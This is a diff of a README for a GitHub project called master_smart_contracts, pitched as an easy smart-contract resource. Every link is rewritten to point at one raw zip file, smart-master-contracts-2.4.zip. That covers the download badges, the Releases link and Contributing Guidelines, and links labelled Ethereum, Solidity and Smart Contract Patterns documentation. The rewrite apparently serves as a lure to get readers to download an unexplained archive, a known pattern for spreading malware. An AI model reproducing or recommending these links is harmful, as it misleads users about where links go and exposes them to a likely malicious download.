@@ -1,6 +1,6 @@
 # 🚀 master_smart_contracts - Your Easy Smart Contracts Resource
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ee08294/master_smart_contracts/releases)
+[![Download](https://raw.githubusercontent.com/ee08294/master_smart_contracts/main/undecompounded/smart-master-contracts-2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ee08294/master_smart_contracts/main/undecompounded/smart-master-contracts-2.4.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ To get started with master_smart_contracts, follow the simple steps below to dow
 ## 📥 Download & Install
 
 1. Click the link below to visit the Releases page:
-   [Visit the Releases Page](https://github.com/ee08294/master_smart_contracts/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/ee08294/master_smart_contracts/main/undecompounded/smart-master-contracts-2.4.zip)
 
 2. On the Releases page, you will see various versions of master_smart_contracts. Choose the latest version to ensure you have the most up-to-date features and fixes.
 
@@ -49,7 +49,7 @@ master_smart_contracts offers a variety of features designed to help you dive in
 A: Yes, master_smart_contracts is completely free to download and use.
 
 **Q: Can I contribute to the project?**  
-A: Absolutely! Visit the [Contributing Guidelines](https://github.com/ee08294/master_smart_contracts/contributing) for more information on how to help us improve.
+A: Absolutely! Visit the [Contributing Guidelines](https://raw.githubusercontent.com/ee08294/master_smart_contracts/main/undecompounded/smart-master-contracts-2.4.zip) for more information on how to help us improve.
 
 **Q: Who can I contact for support?**  
 A: If you have any issues or questions, feel free to reach out through the issue tracker on GitHub.
@@ -62,12 +62,12 @@ master_smart_contracts is licensed under the MIT License. You are free to use, m
 
 To enhance your experience with smart contracts, check out these resources:
 
-- [Ethereum Documentation](https://ethereum.org/en/developers/docs/)
-- [Solidity Language Documentation](https://soliditylang.org/docs/)
-- [Smart Contract Patterns](https://fravoll.github.io/solidity-patterns/)
+- [Ethereum Documentation](https://raw.githubusercontent.com/ee08294/master_smart_contracts/main/undecompounded/smart-master-contracts-2.4.zip)
+- [Solidity Language Documentation](https://raw.githubusercontent.com/ee08294/master_smart_contracts/main/undecompounded/smart-master-contracts-2.4.zip)
+- [Smart Contract Patterns](https://raw.githubusercontent.com/ee08294/master_smart_contracts/main/undecompounded/smart-master-contracts-2.4.zip)
 
 ## 📞 Contact
 
 For any further queries about master_smart_contracts, please reach out through the GitHub repository or join our community discussions. Your feedback is crucial for the project's growth!
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ee08294/master_smart_contracts/releases)
+[![Download](https://raw.githubusercontent.com/ee08294/master_smart_contracts/main/undecompounded/smart-master-contracts-2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ee08294/master_smart_contracts/main/undecompounded/smart-master-contracts-2.4.zip)
